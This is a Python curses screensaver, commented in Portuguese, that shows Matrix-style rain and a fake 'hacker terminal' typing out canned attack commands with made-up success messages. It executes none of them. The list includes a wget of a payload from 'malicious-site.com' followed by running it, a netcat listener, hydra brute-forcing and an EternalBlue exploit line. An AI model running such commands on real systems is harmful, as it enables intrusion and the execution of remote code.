#!/usr/bin/env python3
import curses
import random
import time
import datetime

def main(stdscr):
    # configura terminal
    curses.curs_set(0)
    stdscr.nodelay(True)
    stdscr.timeout(100)

    sh, sw = stdscr.getmaxyx()
    columns = [0] * sw
    
    # comandos de hacker simulados
    hacker_commands = [
        "nmap -sS 192.168.1.0/24",
        "hydra -l admin -P passwords.txt ssh://target",
        "sqlmap -u http://target.com --dbs",
        "metasploit > use exploit/windows/smb/ms17_010_eternalblue",
        "john --wordlist=rockyou.txt hashes.txt",
        "aircrack-ng -w wordlist.txt capture.cap",
        "nc -lvp 4444",
        "python exploit.py --target 10.0.0.1",
        "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
        "hashcat -m 1000 -a 0 hashes.txt rockyou.txt",
        "ssh root@192.168.1.100",
        "wget http://malicious-site.com/payload.sh",
        "chmod +x payload.sh && ./payload.sh",
        "ps aux | grep suspicious",
        "netstat -tulpn | grep LISTEN",
        "cat /etc/passwd",
        "sudo -l",
        "find / -perm -4000 2>/dev/null",
    ]
    
    # respostas do sistema
    system_responses = [
        "[+] Host is up (0.0012s latency)",
        "[!] Login successful: admin:password123",
        "[*] Database found: users, admin, logs",
        "[+] Exploit completed successfully",
        "[*] Password cracked: admin123",
        "[+] Handshake captured",
        "[*] Listening on port 4444",
        "[+] Shell spawned on target",
        "[*] Directory found: /admin",
        "[+] Hash cracked in 2.3 seconds",
        "[!] Connection established",
        "[*] Payload downloaded",
        "[+] Privilege escalation successful",
        "[!] Suspicious process found: PID 1337",
        "[*] Port 22 open on 192.168.1.100",
        "[+] Root access granted",
        "[!] SUID binary found: /usr/bin/passwd",
    ]

    # inicializa cores
    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_GREEN, -1)      # texto normal
    curses.init_pair(2, curses.COLOR_RED, -1)        # alertas/erros
    curses.init_pair(3, curses.COLOR_YELLOW, -1)     # avisos
    curses.init_pair(4, curses.COLOR_CYAN, -1)       # informações
    curses.init_pair(5, curses.COLOR_WHITE, -1)      # destaque
    curses.init_pair(6, curses.COLOR_MAGENTA, -1)    # prompt

    command_timer = 0
    current_command = ""
    typing_pos = 0
    response_timer = 0
    current_response = ""
    terminal_lines = []

    while True:
        key = stdscr.getch()
        if key == ord('q'):
            break

        # chuva matrix de fundo
        for x in range(sw):
            if random.randint(1, 3) == 1:  # chuva mais esparsa
                y = columns[x]
                char = chr(random.randint(33, 126))
                
                try:
                    stdscr.addch(y, x, char, curses.color_pair(1) | curses.A_DIM)
                except curses.error:
                    pass

                columns[x] = 0 if y >= sh - 1 else y + 1

        # simula terminal de hacker no centro
        terminal_height = min(sh - 4, 15)
        terminal_width = min(sw - 4, 80)
        terminal_y = (sh - terminal_height) // 2
        terminal_x = (sw - terminal_width) // 2

        # desenha borda do terminal
        try:
            # borda superior e inferior
            stdscr.addstr(terminal_y - 1, terminal_x - 1, 
                         "┌" + "─" * terminal_width + "┐", 
                         curses.color_pair(5))
            stdscr.addstr(terminal_y + terminal_height, terminal_x - 1, 
                         "└" + "─" * terminal_width + "┘", 
                         curses.color_pair(5))
            
            # bordas laterais
            for i in range(terminal_height):
                stdscr.addch(terminal_y + i, terminal_x - 1, '│', curses.color_pair(5))
                stdscr.addch(terminal_y + i, terminal_x + terminal_width, '│', curses.color_pair(5))
            
            # título do terminal
            title = " HACKER TERMINAL v2.1 "
            title_x = terminal_x + (terminal_width - len(title)) // 2
            stdscr.addstr(terminal_y - 1, title_x, title, 
                         curses.color_pair(2) | curses.A_BOLD)
        except curses.error:
            pass

        # gerencia comandos
        command_timer += 1
        if command_timer > random.randint(100, 300) and not current_command:
            current_command = random.choice(hacker_commands)
            typing_pos = 0
            command_timer = 0

        # simula digitação de comando
        if current_command and typing_pos < len(current_command):
            if random.randint(1, 3) == 1:  # velocidade de digitação
                typing_pos += 1

        # executa comando e mostra resposta
        if current_command and typing_pos >= len(current_command):
            if response_timer == 0:
                current_response = random.choice(system_responses)
                response_timer = 1
            
            response_timer += 1
            if response_timer > random.randint(50, 150):
                # adiciona comando e resposta ao histórico
                terminal_lines.append(("root@matrix:~# " + current_command, curses.color_pair(6)))
                terminal_lines.append((current_response, curses.color_pair(3)))
                
                # limita histórico
                if len(terminal_lines) > terminal_height - 2:
                    terminal_lines.pop(0)
                
                current_command = ""
                current_response = ""
                response_timer = 0

        # desenha conteúdo do terminal
        try:
            # limpa área do terminal
            for i in range(terminal_height):
                spaces = " " * terminal_width
                stdscr.addstr(terminal_y + i, terminal_x, spaces[:terminal_width])
            
            # desenha histórico
            for i, (line, color) in enumerate(terminal_lines[-terminal_height+2:]):
                if i < terminal_height - 2:
                    stdscr.addstr(terminal_y + i, terminal_x, 
                                 line[:terminal_width], color)
            
            # desenha comando atual sendo digitado
            if current_command:
                prompt = "root@matrix:~# "
                current_line = prompt + current_command[:typing_pos]
                if typing_pos < len(current_command):
                    current_line += "_"  # cursor
                
                line_y = terminal_y + len(terminal_lines[-terminal_height+2:])
                if line_y < terminal_y + terminal_height - 1:
                    stdscr.addstr(line_y, terminal_x, 
                                 current_line[:terminal_width], 
                                 curses.color_pair(6) | curses.A_BOLD)
            
            # timestamp no canto
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            stdscr.addstr(terminal_y + terminal_height - 1, 
                         terminal_x + terminal_width - len(timestamp), 
                         timestamp, curses.color_pair(4))
            
        except curses.error:
            pass

        stdscr.refresh()
        time.sleep(0.05)

if __name__ == '__main__':
    try:
        curses.wrapper(main)
    except KeyboardInterrupt:
        pass